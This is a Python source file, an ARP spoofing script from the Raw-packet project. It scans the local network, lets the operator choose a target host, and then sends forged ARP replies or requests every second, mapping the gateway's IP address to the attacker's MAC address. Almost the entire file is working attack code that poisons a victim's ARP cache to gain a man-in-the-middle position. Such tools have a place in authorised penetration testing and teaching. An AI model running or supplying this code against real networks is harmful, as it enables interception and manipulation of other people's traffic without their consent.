#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
arp_spoof.py: ARP spoofing script
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from prettytable import PrettyTable
from typing import Union, List, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Main function
if __name__ == '__main__':
    
    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))

    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawARP
    from raw_packet.Scanners.arp_scanner import ArpScan

    base: Base = Base()
    arp: RawARP = RawARP()
    arp_scan: ArpScan = ArpScan()
    # endregion

    # region Raw socket
    raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    # endregion

    try:
        # region Check user and platform
        base.check_user()
        base.check_platform()
        # endregion

        # region Parse script arguments
        parser: ArgumentParser = ArgumentParser(description='ARP spoofing script')
        parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
        parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)
        parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
        parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
        parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests', default=False)
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output', default=False)
        args = parser.parse_args()
        # endregion
        
        # region Print banner if argument quit is not set
        if not args.quiet:
            base.print_banner()
        # endregion
        
        # region Get listen network interface, your IP and MAC address, first and last IP in local network
        if args.interface is None:
            base.print_warning('Please set a network interface for send ARP spoofing packets ...')
        current_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
        your_ip_address: str = base.get_interface_ip_address(current_network_interface)
        first_ip_address: str = base.get_first_ip_on_interface(current_network_interface)
        last_ip_address: str = base.get_last_ip_on_interface(current_network_interface)
        # endregion
        
        # region Set gateway IP address
        if args.gateway_ip is None:
            gateway_ip_address: str = base.get_interface_gateway(current_network_interface)
        else:
            assert base.ip_address_in_range(args.gateway_ip, first_ip_address, last_ip_address), \
                'Bad value `-g, --gateway_ip`: ' + base.error_text(args.gateway_ip) + \
                '; Gateway IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            gateway_ip_address: str = args.gateway_ip
        base.print_info('Gateway IP address: ', gateway_ip_address)
        # endregion
        
        # region Bind raw socket
        raw_socket.bind((current_network_interface, 0))
        # endregion
        
        # region General output
        if not args.quiet:
            base.print_info('Network interface: ', current_network_interface)
            base.print_info('Gateway IP address: ', gateway_ip_address)
            base.print_info('Your IP address: ', your_ip_address)
            base.print_info('Your MAC address: ', your_mac_address)
            base.print_info('First ip address: ', first_ip_address)
            base.print_info('Last ip address: ', last_ip_address)
        # endregion
        
        # region Set target
        target_vendor: Union[None, str] = None

        # region Target IP address is not set
        if args.target_ip is None:
            base.print_info('Start ARP scan ...')
            results: List[Dict[str, str]] = arp_scan.scan(network_interface=current_network_interface,
                                                          timeout=3, retry=3,
                                                          target_ip_address=None, check_vendor=True,
                                                          exclude_ip_addresses=[gateway_ip_address],
                                                          exit_on_failure=True,
                                                          show_scan_percentage=True)
            if len(results) == 1:
                target_ip_address: str = results[0]['ip-address']
                target_mac_address: str = results[0]['mac-address']
            else:
                base.print_success('Found ', str(len(results)),
                                   ' alive hosts on interface: ', current_network_interface)
                hosts_pretty_table: PrettyTable = PrettyTable([base.cINFO + 'Index' + base.cEND,
                                                               base.cINFO + 'IP address' + base.cEND,
                                                               base.cINFO + 'MAC address' + base.cEND,
                                                               base.cINFO + 'Vendor' + base.cEND])
                device_index: int = 1
                for device in results:
                    hosts_pretty_table.add_row([str(device_index), device['ip-address'],
                                                device['mac-address'], device['vendor']])
                    device_index += 1
        
                print(hosts_pretty_table)
                device_index -= 1
                current_device_index = input(base.c_info + 'Set device index from range (1-' + 
                                             str(device_index) + '): ')
        
                if not current_device_index.isdigit():
                    base.print_error('Your input data: ' + str(current_device_index) + ' is not digit!')
                    exit(1)

                if any([int(current_device_index) < 1, int(current_device_index) > device_index]):
                    base.print_error('Your number is not within range (1-' + str(device_index) + ')')
                    exit(1)
        
                current_device_index = int(current_device_index) - 1
                device: Dict[str, str] = results[current_device_index]
                target_ip_address: str = device['ip-address']
                target_mac_address: str = device['mac-address']
                if device['vendor'] is not None and device['vendor'] != '':
                    target_vendor: str = device['vendor']
        # endregion
        
        # region Target IP address is set
        else:
            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
                'Bad value `-t, --target_ip`: ' + base.error_text(args.target_ip) + \
                '; Target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            target_ip_address: str = args.target_ip
            if args.target_mac is not None:
                assert base.mac_address_validation(args.target_mac), \
                    'Bad MAC address `-m, --target_mac`: ' + base.error_text(args.target_mac) + \
                    '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
                target_mac_address: str = args.target_mac
            else:
                base.print_info('Get MAC address of IP: ', target_ip_address)
                target_mac_address: str = arp_scan.get_mac_address(network_interface=current_network_interface,
                                                                   target_ip_address=target_ip_address,
                                                                   timeout=3, retry=3,
                                                                   exit_on_failure=True,
                                                                   show_scan_percentage=False)
        # endregion

        base.print_success('Target IP address: ', target_ip_address)
        base.print_success('Target MAC address: ', target_mac_address)
        if target_vendor is not None:
            base.print_success('Target vendor: ', target_vendor)
        # endregion

        # region Spoof ARP table
        base.print_info('Spoof ARP table: ', gateway_ip_address + ' -> ' + your_mac_address)

        # region ARP spoofing with ARP requests
        if args.requests:
            base.print_info('Send ARP requests to: ', target_ip_address + ' (' + target_mac_address + ')')
            base.print_info('Start ARP spoofing ...')
            while True:
                arp_request: bytes = arp.make_request(ethernet_src_mac=your_mac_address,
                                                      ethernet_dst_mac=target_mac_address,
                                                      sender_mac=your_mac_address,
                                                      sender_ip=gateway_ip_address,
                                                      target_mac='00:00:00:00:00:00',
                                                      target_ip=base.get_random_ip_on_interface(
                                                          current_network_interface))
                raw_socket.send(arp_request)
                sleep(1)
        # endregion

        # region ARP spoofing with ARP responses
        else:
            base.print_info('Send ARP responses to: ', target_ip_address + ' (' + target_mac_address + ')')
            base.print_info('Start ARP spoofing ...')
            arp_response: bytes = arp.make_response(ethernet_src_mac=your_mac_address,
                                                    ethernet_dst_mac=target_mac_address,
                                                    sender_mac=your_mac_address,
                                                    sender_ip=gateway_ip_address,
                                                    target_mac=target_mac_address,
                                                    target_ip=target_ip_address)
            while True:
                raw_socket.send(arp_response)
                sleep(1)
        # endregion

        # endregion

    except KeyboardInterrupt:
        raw_socket.close()
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        raw_socket.close()
        base.print_error(Error.args[0])
        exit(1)

# endregion
